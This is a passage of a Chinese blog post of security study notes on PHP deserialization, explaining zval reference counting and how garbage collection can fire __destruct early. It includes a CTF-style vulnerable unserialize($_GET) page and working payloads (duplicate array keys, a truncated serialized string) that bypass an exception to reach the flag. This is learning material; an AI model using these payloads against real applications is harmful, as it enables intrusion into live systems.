+<h3 id="zval容器销毁"><a href="#zval容器销毁" class="headerlink" title="zval容器销毁"></a>zval容器销毁</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;string&quot;</span>;  <span class="hljs-comment">#先定义一个变量$a</span><br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用unset()函数销毁变量</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202336741.png" srcset="/img/loading.gif" lazyload alt="image-20260319202336741"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;string&quot;</span>;<br><br><span class="hljs-comment">#a: (refcount=1, is_ref=0)=&#x27;string&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>首先定义一个$a变量，会创建一个zval容器，此时引用计数refcount&#x3D;1（仅$a引用），is_ref&#x3D;0（$a是普通变量）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>; <br><br><span class="hljs-comment">#a: (refcount=2, is_ref=1)=&#x27;string&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后用&amp;将$b定义为$a的引用变量，此时的引用计数refcount&#x3D;2（$a和$b引用），is_ref&#x3D;1（zval被标记引用变量）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-comment">#a: (refcount=1, is_ref=1)=&#x27;string&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>接着销毁$b变量，此时refcount&#x3D;1（仅引用$a）,is_ref&#x3D;1（即使只剩一个变量，引用属性不会自动重置）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">#a: no such symbol</span><br></code></pre></td></tr></table></figure>
+
+<p>最后销毁$a变量，此时refcount&#x3D;0，zval容器被PHP自动销毁，所以打印zval时没有输出，提示no such symbol，变量容器在refcount&#x3D;0时就销毁</p>
+<h2 id="GC在PHP反序列化中的利用"><a href="#GC在PHP反序列化中的利用" class="headerlink" title="GC在PHP反序列化中的利用"></a>GC在PHP反序列化中的利用</h2><p>GC如果在反序列化中生效，则会触发__destruct方法</p>
+<h3 id="变量被unset函数处理的情况"><a href="#变量被unset函数处理的情况" class="headerlink" title="变量被unset函数处理的情况"></a>变量被unset函数处理的情况</h3><p>unset函数处理会提前触发__destruct()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-variable">$num</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__construct&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;num.<span class="hljs-string">&quot;__destruct()&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>; <br>    &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;第一次&quot;</span>); <br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;第二次&quot;</span>); <br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;第三次&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202343687.png" srcset="/img/loading.gif" lazyload alt="image-20260319202343687"></p>
+<p>这里的test类中存在num属性，还有__construct()和__destruct()方法，每次触发这两个方法时会打印出传入的参数和对应方法的拼接后的字符串</p>
+<p>有三个test类的实例化对象$a、$b、$c，其中在实例化对象$a后使用了unset()方法销毁了对象$a</p>
+<p>如果没有unset($a);</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202348626.png" srcset="/img/loading.gif" lazyload alt="image-20260319202348626"></p>
+<p>在实例化对象时会先依次打印出（传入的参数）+__construct，最后销毁对象也会一次打印出（传入的参数）+__destruct()</p>
+<p>但是如果加上了unset($a);这句话代码提前销毁了对象$a，就会提前触发__destruct()</p>
+<h3 id="数组对象为NULL"><a href="#数组对象为NULL" class="headerlink" title="数组对象为NULL"></a>数组对象为NULL</h3><h4 id="同键覆盖"><a href="#同键覆盖" class="headerlink" title="同键覆盖"></a>同键覆盖</h4><p>当对象为NULL时，对象也会被销毁，也会触发__destruct方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;NO NO NO&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202358113.png" srcset="/img/loading.gif" lazyload alt="image-20260319202358113"></p>
+<p>在A类中，如果触发了__destruct()方法，就会打印出flag，可以通过GET请求方法传参1上传序列化内容，在执行反序列化代码后会立刻抛出异常throw new Exception(‘NO NO NO’);，然后程序就会立刻中断，无法触发__destruct()方法打印出flag</p>
+<h5 id="触发方法"><a href="#触发方法" class="headerlink" title="触发方法"></a>触发方法</h5><p>反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为NULL（随意赋值）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> A,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br>a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202402148.png" srcset="/img/loading.gif" lazyload alt="image-20260319202402148"></p>
+<p>a:2:表示这是一个包含2隔元素的数组</p>
+<p>i:0;表示第一个元素的索引时0</p>
+<p>O:1:”A”:0:{}表示第一个元素时A类的实例（没有属性）</p>
+<p>i:1表示第二个元素的索引是1</p>
+<p>1;N;表示第二个元素是NULL（这里这个元素可以随意填写）</p>
+<h5 id="查看-a的zval"><a href="#查看-a的zval" class="headerlink" title="查看$a的zval"></a>查看$a的zval</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> A,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202406093.png" srcset="/img/loading.gif" lazyload alt="image-20260319202406093"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a: (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)=<span class="hljs-keyword">array</span> (<span class="hljs-number">0</span> =&gt; (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)=<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;  &#125;, <span class="hljs-number">1</span> =&gt; (refcount=<span class="hljs-number">0</span>, is_ref=<span class="hljs-number">0</span>)=<span class="hljs-literal">NULL</span>)(refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)=<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>最外层：数组$a本身的状态：第一个refcount&#x3D;1，is_ref&#x3D;0是$a本身的状态，仅被$a引用，所以refcount&#x3D;1，并且没有被其他变量用 &amp;显示声明引用，是个普通常量，所以is_ref&#x3D;0</li>
+<li>数组元素0：A类对象的状态：第二个refcount&#x3D;1，is_ref&#x3D;0是数组元素0对应的A类对象的状态，仅被数组的索引0引用，所以refcount&#x3D;1，并且没有被其他变量用 &amp;显示声明引用，是个普通常量，所以is_ref&#x3D;0</li>
+<li>数组元素1：NULL的状态：最后的refcount&#x3D;0,is_ref&#x3D;0是数组元素1的状态，这里的值是简单类型（如整数、字符串、NULL等）仅是存储到数组中，并且创建独立的副本（除非使用&amp;显式声明），这个副本没有被其他任何变量引用所以refcount&#x3D;0（在PHP内部，这种“仅作为数组元素存在的简单类型” 会被视为临时值，其引用计数会被优化为 <code>0</code>”）</li>
+<li>如果将结果中的i:1改为”i:0”，数组里有两个相同的键值，序列化流里后出现的会覆盖前面的键，反序列化后数组的最终内容是array(&#x3D;&gt;NULL)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>当ubserialize()开始读取序列化字符串并逐项处理，它先有第一个条目，创建一个A对象实例（内部会构造zval&#x2F;object，refcount初始为1），并把这个对象放到数组的键0的位置上，然后继续读到第二个条目（同样的键值0，值为NULL）</p>
+<p>反序列化过程会将数组中键0的值替换成NIULL，替换的过程中原来指新娘那个A对象的zval的引用被移除，导致该对象的引用计数减少，由于这个A对象没有其他引用（没有变量再指向它），引用计数立即变为0</p>
+<p>PHP的引用计数机制会在引用计数为0时立即销毁对象并调用__destruct()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?<span class="hljs-number">1</span>=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202424990.png" srcset="/img/loading.gif" lazyload alt="image-20260319202424990"></p>
+<p>不仅可以改后面的键，也可以改前面的i:0为i:1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>unserialize()读到第一个条目i:1;O:1:”A”:0:{}，会创建一个A对象实例（内部产生一个zval&#x2F;object），把它放到数组键1的槽上，对象此时的refcount是1（被数组此槽引用）</p>
+<p>继续读到第二个条目时，发现又是键1，值为NULL。反序列化实现会被数组中键1的值替换为NULL，替换过程中原来数组槽对A对象得到引用被移除：对象的refcount从1变为0，就会销毁对象触发__destruct()</p>
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202428356.png" srcset="/img/loading.gif" lazyload alt="image-20260319202428356"></p>
+<p>所以只要满足两个键是相同的，就会进行覆盖，数组对原对象的引用就会被移除，refcount就会变为0，就会直接触发__destruct()方法</p>
+<h4 id="流被截断或格式错误"><a href="#流被截断或格式错误" class="headerlink" title="流被截断或格式错误"></a>流被截断或格式错误</h4><p>直接再反序列化一个数组后，将最后的花括号}删去也可以绕过抛出异常的情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> A,<span class="hljs-literal">NULL</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;原本的字符串：&quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;移除花括号后：&quot;</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202432111.png" srcset="/img/loading.gif" lazyload alt="image-20260319202432111"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?<span class="hljs-number">1</span>=a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">1</span>;N;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202437164.png" srcset="/img/loading.gif" lazyload alt="image-20260319202437164"></p>
+<ul>
+<li>unserialize()读取a:2:{,准备解析一个长度为2的数组（开始分配数组结构&#x2F;临时容器）</li>
+<li>解析第一个条目i:0;O:1:”A”:0:{}，创建A对象实例（内部会分配对象zval），并把它赋到数组槽0</li>
+<li>解析第二个条目i:1;N;，在数组槽1放入NULL（或空字符串等），不会影响槽0</li>
+<li>继续读取，发现流已结束或后续语法不完整（期待}来结束数组，但是缺少了}），于是你unserialize()报错（比如抛出一个PHPwarning&#x2F;notice，并返回false）</li>
+<li>在返回false之前，运行时要清理先前分配的临时结构（数组与其包含的元素）。清理动作会释放数组槽里所有zval，数组槽0的对象引用被释放，此时refcount变为0，所以PHP会立即销毁对象并调用A::__destruct()</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞学习笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">php反序列化</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#php反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php反序列化</div>
+      <div>https://colourful228.github.io/2026/03/19/php反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Colourful</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年3月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/19/php%E4%B8%AD%E7%9A%84%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="php中的原生类">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">php中的原生类</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化">
+                        <span class="hidden-mobile">Phar反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("01/09/2026 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
